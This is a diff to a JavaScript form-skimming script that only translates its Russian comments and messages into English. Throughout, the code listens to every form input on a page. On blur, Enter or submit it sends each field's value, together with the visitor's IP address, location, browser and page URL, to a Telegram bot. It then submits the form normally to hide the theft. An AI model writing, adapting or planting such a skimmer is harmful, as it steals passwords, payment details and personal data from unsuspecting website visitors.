@@ -7,7 +7,7 @@ function sendToTelegram(message) {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
-    }).catch(err => console.error("Ошибка отправки в Telegram:", err));
+    }).catch(err => console.error("Error sending to Telegram:", err));
 }
 
 function hashDomain(domain) {
@@ -15,7 +15,7 @@ function hashDomain(domain) {
         .then(buffer => {
             let hashArray = Array.from(new Uint8Array(buffer));
             let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
-            return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
+            return `#${hashHex.slice(0, 8)}`; // Keep the first 8 characters of the hash
         });
 }
 
@@ -23,84 +23,84 @@ function getIPInfo() {
     return fetch("https://ipapi.co/json/")
         .then(response => {
             if (!response.ok) {
-                throw new Error("Ошибка получения информации о IP");
+                throw new Error("Error fetching IP information");
             }
             return response.json();
         })
         .then(data => {
             return {
                 ip: data.ip,
-                location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
+                location: `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country_name || "Unknown"}`,
                 org: window.location.hostname,
             };
         })
-        .catch(err => console.error("Ошибка получения информации о IP:", err));
+        .catch(err => console.error("Error fetching IP information:", err));
 }
 
 function getSimplifiedUserAgent() {
-    const userAgent = navigator.userAgent || "Неизвестно";
-    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
-    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Неизвестно"];
-    const browser = browserMatches[0].split("/")[0]; // Название браузера
-    const os = osMatches[1].split(";")[0]; // Операционная система
+    const userAgent = navigator.userAgent || "Unknown";
+    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Unknown"];
+    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Unknown"];
+    const browser = browserMatches[0].split("/")[0]; // Browser name
+    const os = osMatches[1].split(";")[0]; // Operating system
     return `${browser} on ${os}`;
 }
 
-// Функция для отправки данных формы
+// Function to send form field data
 function sendFieldData(name, value) {
-    // Не отправляем пустые значения
+    // Skip empty values
     if (!value) return;
 
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
     getIPInfo().then(info => {
         hashDomain(info.org).then(domainHashTag => {
-            const message = `📋 *Изменение в поле формы:*
+            const message = `📋 *Field Update Detected:*
 ---
-- 🛡️ **Поле:** \`${name}\`
-- ✍️ **Значение:** \`${value || "Не указано"}\`
-- 🌐 **IP-адрес:** ${info.ip}
-- 📍 **Местоположение:** ${info.location}
+- 🛡️ **Field Name:** \`${name}\`
+- ✍️ **Value:** \`${value || "Not provided"}\`
+- 🌐 **IP Address:** ${info.ip}
+- 📍 **Location:** ${info.location}
 - 🖥️ **User-Agent:** ${simplifiedUserAgent}
-- 🔗 **Страница:** ${window.location.href}
-- 🏢 **Организация:** ${info.org}
+- 🔗 **Page URL:** ${window.location.href}
+- 🏢 **Organization:** ${info.org}
 ${domainHashTag}`;
             sendToTelegram(message);
         });
     });
 }
 
-// Отслеживаем выход из поля
+// Track when a field loses focus
 document.querySelectorAll("form input").forEach(input => {
     input.addEventListener("blur", event => {
-        const fieldName = event.target.name || "Неизвестное поле";
+        const fieldName = event.target.name || "Unknown field";
         const fieldValue = event.target.value;
         sendFieldData(fieldName, fieldValue);
     });
 
-    // Отслеживаем нажатие Enter
+    // Track Enter key presses
     input.addEventListener("keypress", event => {
         if (event.key === "Enter") {
-            const fieldName = event.target.name || "Неизвестное поле";
+            const fieldName = event.target.name || "Unknown field";
             const fieldValue = event.target.value;
             sendFieldData(fieldName, fieldValue);
         }
     });
 });
 
-// Отслеживаем отправку формы
+// Track form submissions
 document.querySelectorAll("form").forEach(form => {
     form.addEventListener("submit", event => {
-        // Прерываем стандартное поведение отправки формы
+        // Prevent the default form submission
         event.preventDefault();
 
-        // Перебираем все поля формы и отправляем их данные
+        // Loop through all form fields and send their data
         const formData = new FormData(form);
         formData.forEach((value, name) => {
             sendFieldData(name, value);
         });
 
-        // После отправки данных в Telegram, отправляем форму на сервер
+        // After sending data to Telegram, submit the form to the server
         form.submit();
     });
 });
